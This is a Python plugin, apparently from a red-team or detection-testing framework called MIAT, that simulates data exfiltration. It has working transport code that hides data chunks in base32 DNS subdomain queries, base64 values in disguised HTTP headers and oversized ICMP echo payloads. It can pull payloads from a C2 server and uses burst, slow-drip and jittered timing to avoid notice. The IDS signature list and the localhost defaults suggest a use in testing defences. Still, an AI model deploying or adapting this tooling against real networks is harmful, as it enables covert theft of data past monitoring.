#!/usr/bin/env python3
# agent/plugins/exfil_plugin.py
# =============================================================================
#  MIAT — Data Exfiltration Simulation Plugin  (Pull-Model integrated)
#
#  Change from original:
#    execute() now reads 'payload_mode' from args:
#      'generated' -> PayloadBuffer.from_generated()  (local, no I/O)
#      'manual'    -> PayloadBuffer.from_remote_pull() (HTTPS GET from C2)
#    Both modes expose buf.chunks(technique) so transport helpers are untouched.
# =============================================================================

import asyncio
import base64
import hashlib
import logging
import random
import time
from datetime import datetime, timezone

from plugin_base    import MIATPlugin
from payload_buffer import PayloadBuffer, CHUNK_SIZES

logger = logging.getLogger('MIAT.ExfilPlugin')

try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

try:
    import dns.resolver
    import dns.exception
    DNS_AVAILABLE = True
except ImportError:
    DNS_AVAILABLE = False

try:
    from scapy.all import IP, ICMP, send, conf as scapy_conf
    scapy_conf.verb = 0
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

_HEADER_CYCLE = [
    ('User-Agent',     'Mozilla/5.0 AppleWebKit/537.36 {}'),
    ('X-Request-ID',   '{}'),
    ('Referer',        'https://cdn.cloudflare.com/assets/{}'),
    ('Accept-Language','en-US,en;q=0.9,{}'),
]

_SIGNATURES = {
    'dns':  ['Unusually long subdomain labels (>30 chars)',
             'High query volume to single parent domain',
             'Base32 character pattern in subdomains'],
    'http': ['Non-standard User-Agent with high entropy',
             'Unusual custom header values (Base64-like)',
             'Repeated requests with consistent header anomaly'],
    'icmp': ['ICMP payload larger than standard 8 bytes',
             'Non-zero ICMP padding content',
             'Repeated ICMP echo to single destination'],
}


class ExfilPlugin(MIATPlugin):

    @property
    def name(self) -> str:    return 'exfil'

    @property
    def version(self) -> str: return '2.0.0'

    @property
    def description(self) -> str:
        return 'Data exfiltration simulation — DNS/HTTP/ICMP with Pull-Model support'

    # =========================================================================
    # EXECUTE
    # =========================================================================

    async def execute(self, args: dict) -> None:
        technique     = args.get('technique',      'dns').lower()
        profile       = args.get('profile',        'burst').lower()
        target        = args.get('target',         '127.0.0.1')
        dns_domain    = args.get('dns_domain',     'exfil-test.local')
        dns_server    = args.get('dns_server',     None)
        http_target   = args.get('http_target',    f'http://{target}')
        drip_interval = float(args.get('drip_interval', 10.0))
        jitter_min    = float(args.get('jitter_min',     1.0))
        jitter_max    = float(args.get('jitter_max',     8.0))
        task_id       = str(args.get('task_id',    ''))
        payload_mode  = args.get('payload_mode',   'generated')

        # ── Availability guards ───────────────────────────────────────────────
        guards = {
            'http': (REQUESTS_AVAILABLE, 'pip install requests'),
            'dns':  (DNS_AVAILABLE,      'pip install dnspython'),
            'icmp': (SCAPY_AVAILABLE,    'pip install scapy + Npcap (Windows)'),
        }
        if technique in guards:
            ok, msg = guards[technique]
            if not ok:
                await self._emit(
                    data={'error': msg, 'task_id': task_id}, success=False)
                return

        # ── Payload acquisition ───────────────────────────────────────────────
        run_id = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]

        if payload_mode == 'manual':
            payload_url       = args.get('payload_url', '')
            expected_checksum = args.get('payload_checksum', '')
            expected_size     = int(args.get('payload_size', 0))

            if not payload_url:
                await self._emit(
                    data={'error': 'payload_url missing for manual mode.',
                          'task_id': task_id}, success=False)
                return

            transport = getattr(self, '_transport', None)
            if transport is None:
                await self._emit(
                    data={'error': 'Transport not injected — cannot pull payload.',
                          'task_id': task_id}, success=False)
                return

            await self._emit_live(
                f'[PULL] Fetching payload from C2 ({expected_size} B expected)…')
            try:
                buf = await PayloadBuffer.from_remote_pull(
                    transport         = transport,
                    payload_url       = payload_url,
                    expected_checksum = expected_checksum,
                    expected_size     = expected_size,
                )
                await self._emit_live(
                    f'[PULL] {buf.size} B received — '
                    f'checksum verified ({buf.checksum_short()})')
            except (ValueError, RuntimeError) as exc:
                await self._emit(
                    data={'error': f'Payload pull failed: {exc}',
                          'task_id': task_id}, success=False)
                return
        else:
            # Generated mode — synthesise locally, instant, no network I/O
            payload_type = args.get('payload_type', 'credentials')
            buf = PayloadBuffer.from_generated(
                payload_type=payload_type, run_id=run_id)

        # ── Slice into per-technique chunks ───────────────────────────────────
        chunks = buf.chunks(technique)
        total  = len(chunks)

        await self._emit_live(
            f'EXFIL [{technique.upper()}][{profile.upper()}] — '
            f'source={buf.source.upper()} {buf.size} B → '
            f'{total} chunks → {target}')

        # ── Dispatch loop ─────────────────────────────────────────────────────
        loop       = asyncio.get_event_loop()
        packets    = []
        successful = 0
        errors     = 0
        hdr_idx    = 0
        start_time = time.time()

        for i, chunk in enumerate(chunks, start=1):
            if self._stop_event.is_set():
                break

            if technique == 'dns':
                result = await loop.run_in_executor(
                    None,
                    lambda c=chunk, s=i: self._send_dns(
                        c, s, run_id, dns_domain, dns_server))
            elif technique == 'http':
                result = await loop.run_in_executor(
                    None,
                    lambda c=chunk, s=i, h=hdr_idx: self._send_http(
                        c, s, h, http_target))
                hdr_idx += 1
            elif technique == 'icmp':
                result = await loop.run_in_executor(
                    None,
                    lambda c=chunk, s=i: self._send_icmp(c, s, target))
            else:
                result = {'error': f'Unknown technique: {technique}'}

            if result.get('error'):
                errors += 1
            else:
                successful += 1

            result['sequence']  = i
            result['timestamp'] = datetime.now(tz=timezone.utc).isoformat()
            packets.append(result)

            desc   = (result.get('query_domain')
                      or result.get('header_name') or target)
            status = (result.get('outcome')
                      or str(result.get('http_status', ''))
                      or ('SENT' if result.get('sent') else 'ERR'))

            await self._emit_live(
                f'[{i:02d}/{total}] {technique.upper()} '
                f'{str(desc)[:55]} → {status}')

            if i < total and not self._stop_event.is_set():
                if   profile == 'burst':     await asyncio.sleep(0.05)
                elif profile == 'slow_drip': await asyncio.sleep(drip_interval)
                elif profile == 'jitter':
                    await asyncio.sleep(random.uniform(jitter_min, jitter_max))

        duration = round(time.time() - start_time, 2)

        summary = {
            'technique':        technique,
            'profile':          profile,
            'target':           target,
            'payload_mode':     buf.source,
            'total_chunks':     total,
            'successful':       successful,
            'errors':           errors,
            'duration_sec':     duration,
            'avg_interval_sec': round(duration / max(total - 1, 1), 2),
            'ids_severity':     'HIGH' if technique in ('dns', 'icmp') else 'MEDIUM',
            'ids_signatures':   _SIGNATURES.get(technique, []),
            'packets':          packets,
            'task_id':          task_id,   # closes ModuleTask loop server-side
        }

        await self._emit_live(
            f'Exfil complete — {successful}/{total} sent in {duration}s '
            f'[source={buf.source}]')
        await self._emit(data=summary, endpoint='/api/agent/exfil/results/')

    # =========================================================================
    # TRANSPORT HELPERS  (unchanged — receive pre-sliced bytes from buf.chunks)
    # =========================================================================

    def _send_dns(self, chunk, seq, session_id, domain, dns_server):
        encoded = base64.b32encode(chunk).decode().rstrip('=').lower()
        query   = f'{encoded}.{seq:03d}.{session_id}.{domain}'
        r = dns.resolver.Resolver()
        r.timeout = r.lifetime = 3
        if dns_server:
            r.nameservers = [dns_server]
        try:
            r.resolve(query, 'A')
            outcome = 'RESOLVED'
        except dns.resolver.NXDOMAIN:
            outcome = 'NXDOMAIN'
        except dns.exception.Timeout:
            outcome = 'TIMEOUT'
        except Exception as exc:
            return {'error': str(exc), 'query_domain': query}
        return {'query_domain': query, 'encoded_label': encoded,
                'label_length': len(encoded), 'raw_bytes': len(chunk),
                'outcome': outcome}

    def _send_http(self, chunk, seq, hdr_idx, target):
        encoded    = base64.b64encode(chunk).decode()
        name, tmpl = _HEADER_CYCLE[hdr_idx % len(_HEADER_CYCLE)]
        value      = tmpl.format(encoded)
        headers    = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'Accept': 'text/html', name: value, 'X-Seq': str(seq),
        }
        try:
            resp = requests.get(target, headers=headers, timeout=5,
                                verify=False, allow_redirects=True)
            return {'header_name': name, 'header_value': value[:80],
                    'http_status': resp.status_code, 'raw_bytes': len(chunk)}
        except Exception as exc:
            return {'header_name': name, 'error': str(exc), 'http_status': 0}

    def _send_icmp(self, chunk, seq, target):
        payload = f'[SEQ:{seq:03d}]'.encode() + chunk
        try:
            send(IP(dst=target) / ICMP(type=8, code=0, seq=seq) / payload)
            return {'target_ip': target, 'payload_bytes': len(payload),
                    'excess_bytes': len(payload) - 8, 'sent': True}
        except PermissionError:
            return {'error': 'Permission denied — run as Administrator/root',
                    'sent': False}
        except Exception as exc:
            return {'error': str(exc), 'sent': False}